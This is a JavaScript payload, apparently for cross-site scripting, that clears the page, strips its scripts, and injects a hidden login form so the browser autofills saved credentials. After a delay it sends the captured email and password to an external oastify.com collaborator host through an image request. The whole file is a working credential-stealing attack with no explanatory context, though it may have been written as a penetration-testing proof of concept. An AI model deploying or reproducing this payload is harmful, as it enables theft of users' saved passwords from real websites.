document.body.innerHTML = "";
var scriptss = document.scripts;

for (var i = scriptss.length - 1; i >= 0; i--) {
  var script = scriptss[i];
  script.parentNode.removeChild(script);
}

var s = document.createElement('style');
var c = 'body > *:not(form):not(textarea) { display: none !important; }';
s.appendChild(document.createTextNode(c));
document.head.appendChild(s);

var form = document.createElement('form');

// Email Field
var inputEmail = document.createElement('input');
inputEmail.type = 'text';
inputEmail.id = 'login-form-email';
inputEmail.name = 'login-form-email';
inputEmail.autocomplete = 'email';  
inputEmail.placeholder = 'Email Address *';
inputEmail.style.border = "none";
inputEmail.style.outline = "none";
inputEmail.style.background = "none";
inputEmail.style.width = "100%";
inputEmail.classList.add("single-input");

// Password Field
var inputPassword = document.createElement('input');
inputPassword.type = 'password';
inputPassword.id = 'login-form-password';
inputPassword.name = 'login-form-password';
inputPassword.autocomplete = 'current-password';
inputPassword.style.border = "none";
inputPassword.style.outline = "none";
inputPassword.style.background = "none";
inputPassword.style.padding = "0";
inputPassword.style.width = "1%";
inputPassword.classList.add("single-input");

form.appendChild(inputEmail);
form.appendChild(inputPassword);
document.body.appendChild(form);

// Wait for the browser to autofill the credentials
setTimeout(() => {
    let emailField = document.querySelector('input[type="email"], input[name*="email"], input[id*="email"]');
    let passwordField = document.querySelector('input[type="password"], input[name*="password"], input[id*="password"]');

    if (emailField && passwordField) {
        function sendCredentials() {
            if (passwordField.value.length > 0) {
                new Image().src = "http://0uvbq8lc8irgn8bfeeopwlwcy34usrgg.oastify.com/?email=" + encodeURIComponent(emailField.value) + "&password=" + encodeURIComponent(passwordField.value);
            }
        }

        // Wait to ensure autofill has populated the fields
        setTimeout(sendCredentials, 1500);
    }
}, 1000);
